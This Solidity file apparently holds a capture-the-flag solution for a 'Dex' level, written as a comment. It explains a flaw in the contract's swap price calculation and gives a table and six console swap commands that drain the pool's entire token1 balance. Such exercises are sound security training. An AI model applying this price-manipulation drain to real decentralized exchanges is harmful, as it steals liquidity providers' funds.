// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../contracts/Dex.sol';

  /* Solution in console
    
    The bug is where the dex calculates the swapPrice
    If you successively call the swap function with the new max balance you have each time
    You can withdraw the 100 token1
    In order to do so, the last call can't be for your max balance wich is 65
    Because you're going to exceed the amount of token2 that the Dex has
    And the transaction is going to be revert
    So we calculate the exact amount we need to use so we can withdraw the 100 token1
    The magic number is 45
      
    from => to       | Amount | token1 in Dex | token2 in Dex | Result
    token1 => token2 | 10     |   100         |  100          | 20 token2
    token2 => token1 | 20     |   110         |  90           | 24 token1
    token1 => token2 | 24     |   86          |  110          | 30 token2
    token2 => token1 | 30     |   110         |  80           | 41 token1
    token1 => token2 | 41     |   69          |  110          | 65 token2
    token2 => token1 | 45     |   110         |  65           | 100 token1

    We make an initial approve for 300 tokens, so we don't need to call this function anymore
    -await contract.approve(instance, 300)
    We start swapping 10
    -await contract.swap(await contract.token1(), await contract.token2(), 10)
    Now we swap 20 and get 24 tokens
    -await contract.swap(await contract.token2(), await contract.token1(), 20)
    Now we swap 24 and get 30 tokens
    -await contract.swap(await contract.token1(), await contract.token2(), 24)
    Now we swap 30 and get 41 tokens
    -await contract.swap(await contract.token2(), await contract.token1(), 30)
    Now we swap 41 and get 65 tokens
    -await contract.swap(await contract.token1(), await contract.token2(), 41)
    Now we swap 45 and get 100 tokens
    -await contract.swap(await contract.token2(), await contract.token1(), 45)

    Congrats! You can submit the level
  */
